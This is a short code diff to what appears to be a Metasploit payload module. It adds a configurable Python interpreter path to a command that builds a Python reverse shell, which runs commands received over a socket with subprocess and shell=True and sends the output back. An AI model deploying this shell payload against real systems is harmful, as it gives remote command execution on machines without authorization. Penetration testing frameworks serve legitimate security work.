@@ -30,6 +30,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('PYTHON_PATH', [true, 'Path to the Python interpreter', 'python'])
+    ])
   end
 
   #
@@ -59,6 +62,6 @@ module MetasploitModule
     cmd += "\tproc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
     cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
     cmd += "\ts.send(stdout_value)\n"
-    "python -c \"#{ py_create_exec_stub(cmd) }\""
+    "#{datastore['PYTHON_PATH']} -c \"#{ py_create_exec_stub(cmd) }\""
   end
 end
